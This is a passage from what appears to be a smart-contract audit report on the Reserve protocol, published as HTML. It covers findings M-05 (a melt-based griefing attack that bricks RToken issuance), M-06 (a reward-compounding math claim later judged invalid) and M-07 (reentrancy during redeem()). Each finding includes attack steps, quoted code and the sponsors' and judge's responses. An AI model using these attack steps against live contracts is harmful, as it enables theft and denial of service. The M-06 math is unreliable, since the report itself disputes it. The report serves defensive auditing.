href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L563-L573\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L563-L573</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L801-L814\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L801-L814</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L219\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L219</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70-L84\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70-L84</a></p>\n<p>Function <code>melt()</code> melt a quantity of RToken from the caller’s account, increasing the basket rate. basket rate should be between <code>1e9</code> and <code>1e27</code> and function <code>requireValidBUExchangeRate()</code> checks that if it’s not in interval the the code would revert. the call to <code>requireValidBUExchangeRate()</code> happens in the function <code>mint()</code>, <code>melt()</code> and <code>setBasketsNeeded()</code> which are used in <code>issue()</code> and <code>handoutExcessAssets()</code> and <code>compromiseBasketsNeeded()</code> which are used in multiple functionality of the systems. early malicious user can call <code>issue(1e18)</code> and <code>melt(1e18 - 1)</code> and then set the ratio between baskets needed and total supply to <code>1e27</code> and then any new action that increase the ratio would fail. because during the <code>issue()</code> code calls <code>melt()</code> so the issue() would fail for sure and other functionalities can increase the ratio because of the ratio too because of the rounding error which result in revert. so by exploiting this attacker can make RToken to be in broken state and most of the functionalities of the system would stop working.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>melt()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function melt(uint256 amtRToken) external notPausedOrFrozen {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _burn(_msgSender(), amtRToken);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Melted(amtRToken);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        requireValidBUExchangeRate();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it allows anyone to burn their RToken balance. This is <code>requireValidBUExchangeRate()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function requireValidBUExchangeRate() private view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 supply = totalSupply();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (supply == 0) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Note: These are D18s, even though they are uint256s. This is because</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // we cannot assume we stay inside our valid range here, as that is what</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // we are checking in the first place</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 low = (FIX_ONE_256 * basketsNeeded) / supply; // D18{BU/rTok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 high = (FIX_ONE_256 * basketsNeeded + (supply - 1)) / supply; // D18{BU/rTok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(uint192(low) &gt;= 1e9 &amp;&amp; uint192(high) &lt;= 1e27, &quot;BU rate out of range&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it checks and makes sure that  the BU to RToken exchange rate to be in [1e-9, 1e9]. so Attacker can perform this steps:</p>\n<ol>\n<li>add <code>1e18</code> RToken as first issuer by calling <code>issue()</code></li>\n<li>call <code>melt()</code> and burn <code>1e18 - 1</code> of his RTokens.</li>\n<li>not <code>basketsNeeded</code> would be <code>1e18</code> and <code>totalSupply()</code> of RTokens would be <code>1</code> and the BU to RToken exchange rate would be its maximum value <code>1e27</code> and <code>requireValidBUExchangeRate()</code> won’t allow increasing the ratio.</li>\n<li>now calls to <code>melt()</code> would revert and because <code>issue()</code> calls to <code>furnace.melt()</code> which calls <code>RToken.melt()</code> so all calls to <code>issue()</code> would revert. other functionality which result in calling <code>mint()</code>, <code>melt()</code> and <code>setBasketsNeeded()</code> if they increase the ratio would fail too. as there is rounding error when converting RToken amount to basket amount so burning and minting new RTokens and increase the ratio too because of those rounding errors and those logics would revert. (<code>handoutExcessAssets()</code> would revert because it mint revenue RToken and update <code>basketsNeeded</code> and it calculates new basket amount based on RToken amounts and rounds down so it would increase the BU to RToken ratio which cause code to revert in <code>mint()</code>) (<code>redeem()</code> would increase the ratio simillar to <code>handoutExcessAssets()</code> because of rounding down)</li>\n<li>the attacker doesn’t need to be first issuer just he needs to be one of the early issuers and by performing the attack and also if the ratio gets to higher value of the maximum allowed the protocol won’t work properly as it documented the supported rage for variables to work properly.</li>\n</ol>\n<p>So attacker can make protocol logics to be broken and then RToken won’t be useless and attacker can perform this attack to any newly deployed RToken.</p>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Don’t allow everyone to melt their tokens or don’t allow melting if totalSupply() become very small.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/384#issuecomment-1403998889\">tmattimore (Reserve) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Understand that <code>issue()</code> plus <code>melt()</code> can brick an RTokens issuance, but redeem should still work. </p>\n<p>So, the RToken would no longer function as expected but no RToken holder funds would be lost. And in fact, RToken holders now have more funds.</p>\n<p>Believe this is severity 2 but we should mitigate so that an annoying person / entity cannot DDOS every RToken on deployment w/ small amounts of capital. RToken holders can always continue to redeem though.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/384#issuecomment-1409460672\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Agreed on downgrading due to no direct loss of significant funds and this mostly being a griefing type attack.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR prevents melting RToken until the RToken supply is at least 1e18: <a href=\"https://github.com/reserve-protocol/protocol/pull/619\">reserve-protocol/protocol#619</a></p>\n</blockquote>\n<p><strong>Status:</strong> Not fully mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/13\">HollaDieWaldfee</a> and 0xA5DF (<a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/70\">here</a> and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/55\">here</a>). Also included in Mitigation Review section below.</p>\n<hr>\n<h2 id=\"m-06-too-few-rewards-paid-over-periods-in-furnace-and-strsr\" style=\"position:relative;\"><a href=\"#m-06-too-few-rewards-paid-over-periods-in-furnace-and-strsr\" aria-label=\"m 06 too few rewards paid over periods in furnace and strsr permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377\">[M-06] Too few rewards paid over periods in Furnace and StRSR</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377\">Franfran</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L77-L79\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L77-L79</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L509-L512\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L509-L512</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/946d9b101dd77275c6cbfe0bfe9457927bd221a9/contracts/p1/StRSR.sol#L490-L493\">https://github.com/reserve-protocol/protocol/blob/946d9b101dd77275c6cbfe0bfe9457927bd221a9/contracts/p1/StRSR.sol#L490-L493</a></p>\n<p>For two instances in the codebase (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L77-L79\"><code>Furnace</code></a> and <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L509-L512\"><code>StRSR</code></a>), the composed rewards calculation seems to be wrong.</p>\n<p>How the rewards are working in these two snippets is that we are first measuring how much <code>period</code> or <code>rewardPeriod</code> occured since the last payout and calculating in only <strong>one</strong> step the rewards that should be distributed over these periods. In other words, it is composing the ratio over periods.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Taken from the <a href=\"https://github.com/reserve-protocol/protocol/blob/946d9b101dd77275c6cbfe0bfe9457927bd221a9/contracts/p1/StRSR.sol#L490-L493\">comments</a>, we can write the formula of the next rewards payout as:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">with n = (i+1) &gt; 0, n is the number of periods</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">rewards{0} = rsrRewards()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">payout{i+1} = rewards{i} * payoutRatio</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">rewards{i+1} = rewards{i} - payout{i+1}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">rewards{i+1} = rewards{i} * (1 - payoutRatio)</span></span></code></pre>\n<p>Generalization:\n$u\\_{i+1} = u\\_{i} * (1 - r)$</p>\n<p>It’s a geometric mean whose growth rate is <code>(1 - r)</code>.</p>\n<p>Calculation of the sum:</p>\n<p><img src=\"https://user-images.githubusercontent.com/51274081/213756676-cbbcf22b-3237-433d-a6e3-9577b6d75474.png\"></p>\n<p>You can play with the graph <a href=\"https://www.desmos.com/calculator/1fnpsnf8nt\">here</a>.</p>\n<p>For a practical example, let’s say that our <code>rsrRewardsAtLastPayout</code> is 5, with a <code>rewardRatio</code> of 0.9.</p>\n<p>If we had to calculate our compounded rewards, from the formula given by the comments above, we could calculate manually for the first elements. Let’s take the sum for n = 3:</p>\n<p>$S = u\\_{2} + u\\_{1} + u\\_{0}$\n$u\\_{2} = u\\_{1} * (1-0.9)$\n$u\\_{1} = u\\_{0} * (1-0.9)$\n$u\\_{0} = rsrRewardsAtLastPayout$</p>\n<p>So,</p>\n<p>$S = u\\_{0} * (1-0.9) * (1-0.9) + u\\_{0} * (1-0.9) + u\\_{0}$</p>\n<p>For the values given above, that’s</p>\n<p>$S = 5 * 0.1² + 5 * 0.1 + 5$\n$S = 5.55$</p>\n<p>If we do the same calculation with the sum formula</p>\n<p><img src=\"https://user-images.githubusercontent.com/51274081/213756989-03bb092b-a0a3-447a-a0e8-83035559be7b.png\">\n$S' = 4.995$</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Rather than dividing by 1 (1e18 from the Fixed library), divide it by the <code>ratio</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Furnace.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payoutRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">minus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">minus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ratio</span><span class=\"mtk1\">).</span><span class=\"mtk11\">powu</span><span class=\"mtk1\">(</span><span class=\"mtk12\">numPeriods</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">payoutRatio</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">lastPayoutBal</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">ratio</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// StRSR.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payoutRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">FixLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">powu</span><span class=\"mtk1\">(</span><span class=\"mtk12\">FIX_ONE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">rewardRatio</span><span class=\"mtk1\">, </span><span class=\"mtk12\">numPeriods</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// payout: {qRSR} = D18{1} * {qRSR} / r</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">payoutRatio</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">rsrRewardsAtLastPayout</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">rewardRatio</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1405453764\">tbrent (Reserve) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>I think there is a mistake in the math here, possibly arising from the fact that <code>rsrRewards()</code> doesn’t correspond to how much rewards <em>has</em> been handed out, but how much is <em>available</em> to be handed out. </p>\n<p>I don’t understand why the warden is computing the sum of <code>u_i</code>. If <code>u_0</code> is the value of <code>rsrRewards()</code> at time 0, and <code>u_1</code> is the value of <code>rsrRewards()</code> at time 1, why is the sum of <code>u_i</code> for all i interesting? This is double-counting balances, since only some of <code>u_i</code> is handed out each time. </p>\n<p>As the number of payouts approach infinity, the total amount handed out approaches <code>u_0</code>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1410642492\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Would be good to get the warden to comment here during QA - will see if we can have that occur to clear up the difference in understanding.</p>\n</blockquote>\n<p><strong><em>Please note: the following comment and re-assessment took place after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.</em></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1428771851\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I want to apologize that I missed the fact that no response was given during QA and currently believe this issue to be invalid.  </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1429273607\">Franfran (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hey friends, sorry for not hopping into the discussion earlier!<br>\nMy reasoning was that if the staker’s rewards doesn’t compound over time, then there is no reason for them to stay in the pool and not harvest the rewards, which is a costly process if they would have to harvest each cycle.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-attacker-can-steal-rtoken-holders-funds-by-performing-reentrancy-attack-during-redeem-function-token-transfers\" style=\"position:relative;\"><a href=\"#m-07-attacker-can-steal-rtoken-holders-funds-by-performing-reentrancy-attack-during-redeem-function-token-transfers\" aria-label=\"m 07 attacker can steal rtoken holders funds by performing reentrancy attack during redeem function token transfers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347\">[M-07] Attacker can steal RToken holders’ funds by performing reentrancy attack during <code>redeem()</code> function token transfers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/318\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/304\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/297\">ustas</a>, and <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/95\">hihen</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150</a></p>\n<p>Function <code>redeem()</code> redeems RToken for basket collateral and it updated <code>basketsNeeded</code> and transfers users basket ERC20 from BackingManager to user address. it loops through tokens and transfer them to caller and if one of tokens were ERC777 or any other 3rd party protocol token with hook, attacker can perform reentrancy attack during token transfers. Attacker can cause multiple impacts by choosing the reentrancy function:</p>\n<ol>\n<li>attacker can call <code>redeem()</code> again and bypass “bounding each withdrawal by the prorata share when protocol is under-collateralized” because tokens balance of BackingManager is not updated yet.</li>\n<li>attacker can call <code>BackingManager.manageTokens()</code> and because <code>basketsNeeded</code> gets decreased and basket tokens balances of BasketManager are not updated, code would detect those tokens as excess funds and would distribute them between RSR stakers and RToken holders and some of RToken deposits would get transferred to RSR holders as rewards.</li>\n</ol>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>redeem()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function redeem(uint256 amount) external notFrozen {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...............</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...............</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 erc20length = erc20s.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint192 prorate = uint192((FIX_ONE_256 * amount) / supply);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Bound each withdrawal by the prorata share, in case we&#39;re currently under-collateralized</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; erc20length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 prorata = (prorate &gt; 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (prorata &lt; amounts[i]) amounts[i] = prorata;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        basketsNeeded = basketsNeeded_ - baskets;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit BasketsNeededChanged(basketsNeeded_, basketsNeeded);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // == Interactions ==</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _burn(redeemer, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool allZero = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; erc20length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (amounts[i] == 0) continue;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (allZero) allZero = false;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            